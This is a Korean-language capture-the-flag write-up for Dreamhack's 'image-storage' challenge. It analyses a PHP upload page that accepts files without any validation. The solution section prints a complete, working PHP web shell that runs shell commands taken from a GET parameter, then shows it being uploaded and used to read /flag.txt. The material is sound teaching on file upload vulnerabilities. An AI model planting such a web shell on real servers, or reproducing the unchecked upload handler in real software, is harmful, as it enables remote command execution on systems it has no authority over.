# [Dreamhack Wargame] image-storage
* 출처: 🚩 image-storage [🔗](https://dreamhack.io/wargame/challenges/38/)
* Reference: File Vulnerability - File Upload Vulnerability
* 문제 설명
  <br/><br/>
  <img width="1072" alt="image-storage_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/da04a0b7-9661-41fd-9262-ce4d918c8b28">

<br/><br/>

## 문제 파일 및 취약점 분석
### index.php (인덱스 페이지)
```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li> <!--list.php로 이동하는 메뉴를 출력-->
            <li><a href="/upload.php">Upload</a></li> <!--upload.php로 이동하는 메뉴를 출력-->
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/>
    <div class="container">
    	<h2>Upload and Share Image !</h2>
    </div> 
</body>
</html>
```

<br/>

### list.php (파일 목록을 나열하는 페이지)
```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container"><ul>
    <?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html')); // 제외할 문자열: '..', '.'. 'index.html'
        foreach ($scanned_directory as $key => $value) {
            // $directory(=./uploads)의 파일들 중 ., .., index.html을 제외한 나머지 파일들을 나열함
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?> 
    </ul></div> 
</body>
</html>
```

<br/>

### upload.php (파일 업로드 페이지) ***← ⚠️ 취약점 존재***
```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') { // Post 메소드로 요청 시
    if (isset($_FILES)) {
      $directory = './uploads/'; # 이용자가 요청으로 전달한 파일을 업로드할 디렉토리 경로
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) { // 동일한 이름을 가진 파일이 존재하는 경우
          echo $name . " already exists. ";
        }else { // 동일한 이름을 가지는 파일이 존재하지 않는 경우
          if(move_uploaded_file($tmp_name, $directory . $name)){ // 이용자가 업로드한 파일을 uploads 폴더에 복사함
            echo "Stored in: " . $directory . $name; # 이용자는 /uploads/[FILENAME]을 이용해 파일에 접근할 수 있음
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```
* upload.php에서 업로드할 파일에 대해 어떠한 검사도 수행하지 않음 **→ 웹 셸 업로드 공격**에 취약함 (File Upload Vulnerability)
	- .php 확장자를 가지는 웹 셸 파일을 작성하고 업로드한 후 해당 파일의 경로로 방문하면 서버의 셸을 손쉽게 획득할 수 있음
		+ ‼️ ***CGI에 의해 해당 코드를 실행하게 만들기 위해선 <U>작성한 php 파일은 GET 요청을 보낼 수 있어야 함***
  		+ 저장 경로는 업로드가 성공적으로 이뤄진다면 화면에 ```Stored in: /uploads/[filename]``` 형식으로 출력됨

<br/><br/>

## 문제 풀이 (익스플로잇)
1. php 웹 셸 파일(image_storage_exploit.php) 파일을 다음과 같이 작성함
    ```php
    <html>
	  <body>
		<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
			<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
			<input type="SUBMIT" value="Execute">
		</form>
		<pre>
			<?php
				if (isset($_GET['cmd'])) {
					system($_GET['cmd']); // php의 system 함수: 전달된 인자(text 타입의 <input> 태그에서 이용자의 입력을 받아옴, cmd)를 셸 프로그램에 전달해 명령어를 실행함 [Command Injection 참고]
				}
			?>
		</pre>
	  </body>
    </html>
    ```

<br/>

2. 1번에서 작성한 php 웹 셸 코드를 /upload 페이지에서 [파일 선택] 버튼을 눌러 업로드하면 화면에서 "Stored in: " 뒤에 해당 파일이 저장된 경로를 얻을 수 있음
   <br/><br/>
   <img width="1512" alt="image-storage_문제 풀이 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/39077c0f-67c6-4223-b614-eb30888145ea">

<br/>

3. 2번에서 얻은 경로를 통해 해당 파일에 접근하면 업로드한 php 웹 셸 코드가 실행되고, cat 명령어를 통해 텍스트 파일의 내용을 출력하여(```cat /flag.txt```) FLAG를 획득할 수 있음
   <br/><br/>
   <img width="1512" alt="image-storage_문제 풀이 3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/f5079724-8347-4029-9844-1566fa6f9761">
